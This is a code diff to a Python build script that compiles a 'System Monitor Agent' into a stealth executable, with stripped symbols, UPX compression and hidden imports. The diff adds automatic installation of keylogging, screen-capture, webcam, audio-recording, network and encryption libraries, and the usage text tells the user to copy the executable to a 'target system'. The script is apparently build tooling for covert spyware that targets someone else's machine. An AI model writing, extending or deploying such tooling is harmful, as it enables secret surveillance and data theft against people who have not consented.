@@ -2,6 +2,7 @@
 """
 Stealth Build Script for System Monitor Agent
 This script compiles the agent into a standalone executable with maximum stealth.
+Automatically installs all required dependencies before building.
 """
 
 import os
@@ -9,6 +10,60 @@ import sys
 import subprocess
 import shutil
 from pathlib import Path
+
+def install_dependencies():
+    """Install all required dependencies from requirements.txt"""
+    print("[+] Installing required dependencies...")
+    
+    # Check if requirements.txt exists
+    if not os.path.exists("requirements.txt"):
+        print("  ✗ requirements.txt not found. Creating minimal requirements...")
+        minimal_requirements = """# Core dependencies for stealth agent
+requests>=2.31.0
+cryptography>=42.0.0
+psutil>=5.9.0
+numpy>=1.24.0
+opencv-python>=4.7.0
+Pillow>=9.5.0
+mss>=10.0.0
+pynput>=1.7.6
+pyautogui>=0.9.53
+pywin32>=300; sys_platform == 'win32'
+wmi>=1.5.1; sys_platform == 'win32'
+keyboard>=0.13.5
+dnspython>=2.3.0
+pycryptodome>=3.18.0
+pyOpenSSL>=23.2.0
+watchdog>=3.0.0
+sounddevice>=0.4.6
+scipy>=1.10.0
+pywinauto>=0.6.8; sys_platform == 'win32'
+"""
+        with open("requirements.txt", "w") as f:
+            f.write(minimal_requirements)
+        print("  ✓ Created minimal requirements.txt")
+    
+    # Install dependencies
+    try:
+        print("  📦 Installing packages from requirements.txt...")
+        result = subprocess.run([
+            sys.executable, "-m", "pip", "install", "-r", "requirements.txt"
+        ], capture_output=True, text=True, check=True)
+        
+        if result.returncode == 0:
+            print("  ✓ Dependencies installed successfully!")
+            return True
+        else:
+            print(f"  ✗ Failed to install dependencies: {result.stderr}")
+            return False
+            
+    except subprocess.CalledProcessError as e:
+        print(f"  ✗ Error installing dependencies: {e}")
+        print(f"  stderr: {e.stderr}")
+        return False
+    except Exception as e:
+        print(f"  ✗ Unexpected error: {e}")
+        return False
 
 def check_requirements():
     """Check if required build tools are available"""
@@ -37,6 +92,36 @@ def check_requirements():
         print("  ! UPX not found (optional for compression)")
         return False
 
+def verify_critical_modules():
+    """Verify that critical modules can be imported"""
+    print("[+] Verifying critical modules...")
+    
+    critical_modules = [
+        "cv2",           # OpenCV for webcam
+        "numpy",         # Required by OpenCV
+        "PIL",           # Pillow for image processing
+        "psutil",        # System monitoring
+        "requests",      # Network communication
+        "cryptography"   # Encryption
+    ]
+    
+    failed_modules = []
+    
+    for module in critical_modules:
+        try:
+            __import__(module)
+            print(f"  ✓ {module} imported successfully")
+        except ImportError as e:
+            print(f"  ✗ {module} import failed: {e}")
+            failed_modules.append(module)
+    
+    if failed_modules:
+        print(f"  ⚠️  {len(failed_modules)} critical modules failed to import")
+        return False
+    else:
+        print("  ✓ All critical modules verified")
+        return True
+
 def build_stealth_executable():
     """Build the stealth executable"""
     print("\n[+] Building stealth executable...")
@@ -53,9 +138,14 @@ def build_stealth_executable():
         "--strip",                     # Strip debug symbols
         "--exclude-module=tkinter",    # Exclude GUI modules
         "--exclude-module=matplotlib", # Exclude plotting
-        "--exclude-module=numpy",      # Exclude large modules
         "--exclude-module=pandas",     # Exclude data analysis
         "--add-data=modules;modules",  # Include modules directory
+        "--hidden-import=cv2",         # Ensure OpenCV is included
+        "--hidden-import=numpy",       # Ensure numpy is included
+        "--hidden-import=PIL",         # Ensure Pillow is included
+        "--hidden-import=psutil",      # Ensure psutil is included
+        "--hidden-import=requests",    # Ensure requests is included
+        "--hidden-import=cryptography", # Ensure cryptography is included
         "agent.py"                     # Main script
     ]
     
@@ -133,6 +223,18 @@ def main():
         print("❌ Error: agent.py not found. Run this script from the agent directory.")
         sys.exit(1)
     
+    # Install dependencies first
+    if not install_dependencies():
+        print("❌ Failed to install dependencies. Please check the error messages above.")
+        sys.exit(1)
+    
+    # Verify critical modules
+    if not verify_critical_modules():
+        print("❌ Critical modules verification failed. The executable may not work properly.")
+        response = input("Continue anyway? (y/N): ").lower().strip()
+        if response != 'y':
+            sys.exit(1)
+    
     # Check requirements
     has_upx = check_requirements()
     
@@ -160,6 +262,14 @@ def main():
         
         if has_upx:
             print("  ✓ UPX compression")
+        
+        print("\n📦 Dependencies Included:")
+        print("  ✓ OpenCV (webcam functionality)")
+        print("  ✓ NumPy (numerical operations)")
+        print("  ✓ Pillow (image processing)")
+        print("  ✓ psutil (system monitoring)")
+        print("  ✓ requests (network communication)")
+        print("  ✓ cryptography (encryption)")
         
         print("\n🚀 Usage:")
         print("  1. Copy SystemMonitor.exe to target system")
